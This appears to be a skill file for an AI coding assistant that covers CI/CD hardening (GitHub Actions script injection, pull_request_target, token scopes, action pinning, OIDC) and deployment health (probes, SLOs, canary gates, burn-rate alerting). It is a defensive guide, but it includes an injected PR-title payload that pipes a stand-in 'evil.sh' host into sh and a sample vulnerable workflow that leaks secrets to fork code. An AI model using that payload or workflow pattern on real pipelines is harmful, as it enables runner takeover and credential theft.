---
name: devops-pipeline
description: CI/CD review and hardening — GitHub Actions (script injection, pull_request_target, token permissions, action pinning, OIDC vs long-lived keys), GitLab CI, secret leakage through logs and artifacts, dependency supply chain, plus deployment and runtime health (liveness vs readiness probes, SLO and error budget, canary promotion gates, rollback, burn-rate alerting). Use when writing or reviewing workflow files, when a build leaks a secret, when designing a deployment pipeline, when setting an SLO or deciding what should page, or when a rollout needs a gate or a rollback path.
globs:
  - ".github/workflows/**"
  - "**/.gitlab-ci.yml"
  - "**/Jenkinsfile"
  - "**/azure-pipelines.yml"
alwaysApply: false
---

# CI/CD — Review & Hardening

A pipeline is a production pathway holding production credentials. Compromise here
bypasses every application-level control.

## GitHub Actions — the four most dangerous mistakes

### 1. Script injection through `${{ }}`

```yaml
# DANGEROUS — the PR title goes straight into the shell
- run: echo "PR: ${{ github.event.pull_request.title }}"
```

A title of `"; curl evil.sh | sh; #` executes on the runner. `${{ }}` expressions are
substituted **before** shell parsing, so quoting inside the shell does not help.

```yaml
# SAFE — passed through the environment, quoted
- run: echo "PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Untrusted inputs: `title`, `body`, `head_ref`, `label`, `comment.body`, author name.

### 2. `pull_request_target` (the Pwnrequest)

This trigger runs with **full repository secrets** and a write-capable token, in the base
repository context — while the pull request itself comes from anyone's fork. If the
workflow also checks out the PR code:

```yaml
on: pull_request_target          # secrets available
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: "${{ github.event.pull_request.head.sha }}" }   # attacker's code
      - run: npm install && npm run build    # executed -> secrets exfiltrated
```

Rule: `pull_request_target` must **never** check out and execute PR code. If you need to
build fork code, use plain `pull_request`, which has no secrets.

### 3. Overly broad token permissions

```yaml
permissions:
  contents: read        # set a minimal default at workflow level
```

Without this, `GITHUB_TOKEN` may carry write scopes. Escalate per job only where needed
(`packages: write`, `id-token: write`).

### 4. Unpinned actions

```yaml
- uses: actions/checkout@v4                                        # mutable tag
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # SHA — correct
```

A mutable tag means the action owner, or whoever compromises them, controls the code
you execute.

## Credentials

- **Prefer OIDC over long-lived keys.** `id-token: write` plus role assumption removes the
  need to store `AWS_ACCESS_KEY_ID` at all
- The OIDC trust policy must pin `sub` to a specific repository **and** branch or
  environment — `repo:org/*` means any repository in the org can assume the role
- Secrets are not automatically safe from logs: `echo $SECRET | base64` defeats masking.
  Check artifacts and test reports too
- Require environment protection rules (reviewers) for production deploys

## Runners and artifacts

- [ ] Self-hosted runners are **not** used for fork workflows — an attacker's job gets a
      shell on your infrastructure; use ephemeral runners if unavoidable
- [ ] Artifacts contain no `.env`, keys, or production config
- [ ] Build logs do not dump the environment (`printenv`, `set -x` with secrets in scope)
- [ ] Caches are not shared across a trust boundary (cache poisoning from fork PRs)

## Supply chain

- [ ] Lockfiles committed and enforced (`npm ci`, `go mod verify`, Gradle verification metadata)
- [ ] Dependencies scanned (trivy/grype/dependabot) **and results acted on**, not merely produced
- [ ] Internal registries cannot be shadowed by public packages (dependency confusion) —
      scopes and namespaces claimed
- [ ] Base images pinned by digest, not `:latest`

## Deployment and runtime health

A pipeline's job does not end when the artifact ships. These are the signals that decide
whether a rollout continues or reverses.

**Probes — liveness and readiness are different questions**

- Liveness answers "should this process be killed and restarted". Readiness answers
  "should traffic be routed here". Conflating them is a classic outage amplifier: a slow
  dependency fails the check, the orchestrator restarts the pod, the restart adds load,
  and you get a restart loop precisely when you can least afford one
- Liveness must not check dependencies. A process with a dead database is still alive —
  it is simply not ready
- Slow-booting applications need a startup probe, otherwise liveness kills them mid-boot

**SLO and error budget**

- Measure the SLI from the user's side — request success rate, latency percentile — not
  from host CPU. Saturation is a cause; users experience symptoms
- An SLO is a target plus a window: 99.9% over 30 days. The error budget is the failure
  still permitted inside that window
- 100% is not a target. It prices out all change. The budget exists so that shipping speed
  and reliability trade against each other explicitly instead of by argument
- Budget exhausted → releases pause until it recovers. An error budget nobody enforces is
  decoration

**Rollout and rollback**

- Progressive delivery (canary, blue-green) only helps if the promotion gate reads an SLI.
  A gate that waits on a timer proves nothing except that time passed
- Rollback must be rehearsed and time-bounded. "We can always roll forward" is not a plan
  at 3am with a broken build
- A schema change must stay backward compatible for one release, or rollback is impossible
  even when the deployment tooling works perfectly — expand/contract, see `db-operations`

**Alerting**

- Page on symptoms (user-facing errors, burn rate), not on causes (CPU high). Cause alerts
  fire without impact and train people to ignore them
- Use multi-window burn-rate alerts: fast burn pages, slow burn opens a ticket
- Every page must be actionable right now. If nobody would act at 3am, it is a ticket

Signal design, cardinality, and correlation ids → `blue-team-detection`.

## Workflow review checklist

- [ ] No untrusted `${{ }}` input interpolated directly into `run:`
- [ ] `pull_request_target` does not execute PR code
- [ ] `permissions:` explicit and minimal
- [ ] Third-party actions pinned to a SHA
- [ ] Credentials via OIDC; trust policy not wildcarded
- [ ] Production deploys require approval
- [ ] No secret can reach logs or artifacts
